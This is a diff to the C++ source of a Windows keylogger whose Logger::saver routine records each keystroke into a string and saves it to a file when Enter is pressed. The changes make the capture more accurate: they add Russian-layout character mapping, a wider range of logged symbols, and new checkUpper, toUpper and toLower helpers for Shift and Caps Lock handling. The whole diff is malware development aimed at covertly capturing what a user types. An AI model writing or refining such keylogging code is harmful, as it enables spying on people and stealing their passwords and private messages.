@@ -45,7 +45,7 @@ void Logger::saver() {
         {
             switch (c)
             {
-            case VK_LBUTTON:
+            /*case VK_LBUTTON:
                 instance->simbols += "<LMOUSE>";
                 break;
 
@@ -55,7 +55,7 @@ void Logger::saver() {
 
             case VK_MBUTTON:
                 instance->simbols +=  "<MMOUSE>";
-                break;
+                break;*/
 
             case VK_RETURN:
                 instance->saveToFile();
@@ -67,20 +67,20 @@ void Logger::saver() {
             case VK_RMENU:
                 break;
 
-            case VK_CONTROL:
+            /*case VK_CONTROL:
                 instance->simbols +=  "<CTRL>";
                 break;
 
             case VK_MENU:
                 instance->simbols +=  "<ALT>";
-                break;
+                break;*/
 
             case VK_BACK:
                 instance->simbols +=  "<BACKSPACE>";
                 break;
 
             case VK_TAB:
-                instance->simbols +=  "<TAB>";
+                instance->simbols +=  " ";
                 break;
 
             case VK_ESCAPE:
@@ -177,8 +177,10 @@ void Logger::saver() {
                 break;
 
             case VK_OEM_COMMA:
+                //изменила на русский символ (аналогично остальные)
+                //todo проверка на большую букву! 
                 if (LOWORD(kLayout) == rusLangId)
-                    instance->simbols +=  "á";
+                    instance->simbols +=  "б"; 
                 else
                     instance->simbols +=  ",";
                 break;
@@ -239,16 +241,18 @@ void Logger::saver() {
                 break;
 
             default:
-                if ((c >= 0x41 && c <= 0x5A) ||
-                    (c >= 0x30 && c <= 0x39) ||
-                    (c == VK_SPACE))
+                if ((c >= 0x41 && c <= 0x5A) || //ENG
+                    (c >= 0x30 && c <= 0x39) || //NUMBERS
+                    (c >= VK_SPACE && c <= 0x2F)) //SYMBOLS
                 {
                     GetKeyboardState(lpKeyboard);
                     ToUnicodeEx(c, MapVirtualKey(c, 0), lpKeyboard, &wChar, 2, 0, kLayout);
                     WideCharToMultiByte(CP_ACP, 0, &wChar, -1, &d, 1, NULL, NULL);
-                    short G = GetKeyState(VK_LSHIFT);
-                    if (GetAsyncKeyState(VK_RSHIFT) & 1 || GetKeyState(VK_LSHIFT) & 1) {
+                    if (checkUpper()) {
                         d = toUpper(d);
+                    }
+                    else {
+                        d = toLower(d);
                     }
                     instance->simbols +=  d;
                 }
@@ -263,8 +267,28 @@ void Logger::saver() {
     }
 }
 
+bool Logger::checkUpper()
+{
+    short shiftDown = GetKeyState(VK_SHIFT) & 0x8000;
+    short ctrlToggle = GetKeyState(VK_CAPITAL) & 1;
+    ofstream f("checkupper.txt", ios::app);
+    f << shiftDown << " " << ctrlToggle << endl;
+    return shiftDown && !ctrlToggle || !shiftDown  && ctrlToggle;
+}
+
 char Logger::toUpper(char letter) {
-    return letter - 32;
+    if (letter >= 97 && letter <= 122 || letter >= -32 && letter <= -1) {
+        return letter - 32;
+    }
+    return letter;
+}
+
+char Logger::toLower(char letter)
+{
+    if (letter >= 65 && letter <= 90 || letter >= -64 && letter <= -33) {
+        return letter + 32;
+    }
+    return letter;
 }
 
 
